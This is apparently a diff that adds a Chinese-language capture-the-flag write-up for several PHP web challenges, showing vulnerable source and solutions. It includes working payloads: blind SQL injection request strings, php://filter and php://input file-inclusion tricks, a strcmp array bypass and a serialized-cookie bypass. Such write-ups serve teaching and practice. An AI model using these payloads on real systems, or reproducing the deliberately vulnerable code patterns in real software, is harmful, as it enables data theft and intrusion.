@@ -202,3 +202,196 @@ for i in itertools.product(p, p, p, p, p, p, p, p):
 
 ![](qpdecode.png)![](jiuzaiyanqian-flag.png)
 
+---
+
+## 2017/10/30
+
+### web
+
+#### 签到题
+
+> 更大的数，格式bdctf{xxx}
+> http://1ccb637956167fe75634730d3d5e9d71.yogeit.com:8080
+
+修改表单长度限制。`bdctf{s0m2thing_ju8t_1ik2_thi8}`
+
+#### 简单的题
+
+> 格式flag{xxxx}
+> http://f944ecfceaddb11ec591f23738496e52.yogeit.com:8080
+
+```php
+if(isset($_POST['password'])) {
+    if (strcmp($_POST['password'], $flag) == 0)
+        die($flag);
+    else
+        echo "密码不正确！";
+}
+```
+
+post一个数组 `password[]=` 即可。`flag{Y0u_4re_G3t_FLAG_452}`
+
+#### WEB100-2
+
+> 提示是?hint，格式是flag{xxxx}
+> http://78a06773a04246464d8eeadd2cdf28af.yogeit.com:8080
+
+根据提示访问http://127.0.0.1/ctfoj/bdctf.php?hint 得到源码。
+带上`Cookie: BDCTF=s:21:"BDCTF:www.bluedon.com"%3b ` 即可得到`flag{pBXeeZdOkG1QTP1}` 。cookie中的分号要url编码一下。
+
+```php
+<?php  
+error_reporting(0);  
+$KEY='BDCTF:www.bluedon.com';  
+include_once("flag.php");  
+
+$cookie = $_COOKIE['BDCTF'];  
+
+if(isset($_GET['hint'])){  
+    show_source(__FILE__);  
+}  
+elseif (unserialize($cookie) === "$KEY")  
+{     
+    echo "$flag";  
+}  
+else {  foo
+```
+
+#### 蓝盾管理员
+
+> you are not bd-admin，格式bdctf{xxx}
+> http://2a8da10821f39ea335a12fba77f7c3fc.yogeit.com:8080
+
+访问`view-source:http://2a8da10821f39ea335a12fba77f7c3fc.yogeit.com:8080/?file=php://filter/convert.base64-encode/resource=flag.php&user=php://input` 同时post `the user is bdadmin` 得到`bd-admin!<br>PD9waHAgIA0KLy9iZGN0ZntMZmlfQW5EX01vcmV9ICANCj8+ ` ，解码后得到`bdctf{Lfi_AnD_More} `
+
+```php
+//index.php
+<!--  
+@$user = $_GET["user"];  
+@$file = $_GET["file"];  
+  
+if(isset($user)&&(file_get_contents($user,'r')==="the user is bdadmin")){  
+    echo "hello bd-admin!<br>";  
+	include($file); //flag.php  
+}else{  
+    echo "you are not bd-admin ! ";  
+}  
+ -->  
+```
+
+#### 送大礼
+
+> 格式bdctf{xxx}
+> http://04c432a12784d2fb5ef431ec3366bc9a.yogeit.com:8080
+
+访问 `http://04c432a12784d2fb5ef431ec3366bc9a.yogeit.com:8080/flag.txt`  有jsfuck，[解开](http://codertab.com/jsunfuck) 后内容如下：
+
+```php
+extract($_GET);  
+if(isset($bdctf))  
+{      
+  $content=trim(file_get_contents($flag));
+  if($bdctf==$content)
+  {
+    echo'bdctf{**********}';
+  }    else
+  { 
+    echo'这不是蓝盾的密码啊';
+  } 
+}
+```
+
+访问 `http://04c432a12784d2fb5ef431ec3366bc9a.yogeit.com:8080/?bdctf=foo&flag=php://input` 同时post `foo` 得到`bdctf{UCCdlsZyVe} ` 。
+
+#### 火星撞地球
+
+> flag{1q2w3e4r}
+> 密码就是答案，格式flag{xxxx}
+> http://eef6f0186546043da56bf4c7f7e6d3ca.yogeit.com:8080
+
+获取当前数据库名member
+
+```
+name=admin%27%20and%20(ASCII(MID((database()),6,1)))=114%23&password=%27%20or%201&submit2=%E4%BC%9A%E5%91%98%E7%99%BB%E5%BD%95
+```
+
+当前数据库只有一个表
+
+```
+name=admin%27%20and%20(ASCII(MID((select%20count(table_name)%20from%20information_schema.tables%20where%20table_schema=database()),1,1)))=49%23&password=%27%20or%201&submit2=%E4%BC%9A%E5%91%98%E7%99%BB%E5%BD%95
+```
+
+当前表名为member
+
+```
+name=admin%27%20and%20(ASCII(MID((select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),7,1)))>0%23&password=%27%20or%201&submit2=%E4%BC%9A%E5%91%98%E7%99%BB%E5%BD%95
+```
+
+当前表有四条记录
+
+```
+name=admin%27%20and%20(ASCII(MID((select%20count(*)%20from%20member),1,1)))=52%23&password=%27%20or%201&submit2=%E4%BC%9A%E5%91%98%E7%99%BB%E5%BD%95
+```
+
+得到列名'id,member_user,member_password,member_name，。。。'
+
+```
+name=admin%27%20and%20(ASCII(MID((select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema='member'),44,1)))>44%23&password=%27%20or%201&submit2=%E4%BC%9A%E5%91%98%E7%99%BB%E5%BD%95
+```
+
+查询密码字段 burp爆破得到'5416d7cd6ef195a0f7622a9c56b55e84'，即'1q2w3e4r'。
+
+```
+name=admin%27%20and%20(ASCII(MID((select%20member_password%20from%20member%20where%20member_user='admin'),1,1)))=53%23&password=%27%20or%201&submit2=%E4%BC%9A%E5%91%98%E7%99%BB%E5%BD%95
+```
+
+最后flag为`flag{1q2w3e4r}` 
+
+#### 密室杀人案[x]
+
+> 格式bdctf{xxxx}
+> http://417c9d88ead6809efb1d310fe6832f56.yogeit.com:8080
+
+```html
+bdctf--密室谋杀案
+这是一场发生在PHP序列化密室里面的谋杀案，今日这里发生了一起密室谋杀案，有一个名叫flag的人被杀害。案发现场发生在这个家里面，然而flag他的尸体被嫌疑人藏匿了起来,无法获得更多被害人的信息。 作案的嫌疑人在这个屋子里面，在这屋子里面的人有三兄弟和一个侦探 ，三兄弟中老大Ford权威最高，其他兄弟都在它的保护下生活,因为三兄弟的勤劳勇敢也经常被其他人调去工作任劳任怨。二哥Walker性格生性好动，喜欢结交朋友也经常找老三帮忙。 老三David为人老实憨厚，和二哥关系最好却有一天因为某件事情离开了这个家,成立了另外一个家。还有就是侦探，侦探wesley他案发当天也在现场，他似乎知道些什么但似乎迫于某种压力没有说出凶手是谁。 只要你收集足够多三兄弟的信息给wesley，相信他会说出真相。
+```
+
+#### bluedon用户[x]
+
+> 格式，bdctf{xxxxx}
+> http://11537c131de3f8b2060b36c0cf7eb083.yogeit.com:8080
+
+```php
+//index.php
+you are not bluedon ! 
+<!--
+$user = $_GET["user"];
+$file = $_GET["file"];
+$pass = $_GET["pass"];
+
+if(isset($user)&&(file_get_contents($user,'r')==="the user is bluedon")){
+    echo "hello bluedon!<br>";
+    include($file); //class.php
+}else{
+    echo "you are not bluedon ! ";
+}
+ -->
+   
+//class.php
+//view-source:http://11537c131de3f8b2060b36c0cf7eb083.yogeit.com:8080/?file=php://filter/convert.base64-encode/resource=class.php&user=php://input
+
+the user is bluedon
+<?php
+class Read{//f1a9.php
+    public $file;
+    public function __toString(){
+        if(isset($this->file)){
+            echo file_get_contents($this->file);    
+        }
+        return "恭喜get flag";
+    }
+}
+?>
+```
+
